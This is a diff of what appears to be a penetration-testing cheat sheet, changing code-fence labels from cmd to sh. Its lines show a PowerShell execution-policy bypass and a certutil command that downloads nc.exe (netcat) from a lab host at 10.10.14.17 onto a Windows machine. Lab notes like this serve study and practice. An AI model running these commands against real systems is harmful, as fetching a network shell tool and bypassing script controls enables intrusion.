@@ -2,7 +2,7 @@
 
 ## Getting powershell to run script without entering powershell console mode
 
-```cmd
+```sh
 powershell.exe -noprofile -executionpolicy bypass -file .\script.ps1
 ```
 
@@ -12,7 +12,7 @@ powershell.exe -noprofile -executionpolicy bypass -file .\script.ps1
 
 If you don't have powershell access:
 
-```cmd
+```sh
 certutil.exe -urlcache -split -f "http://10.10.14.17/nc.exe" c:\temp\nc.exe
 ```
 
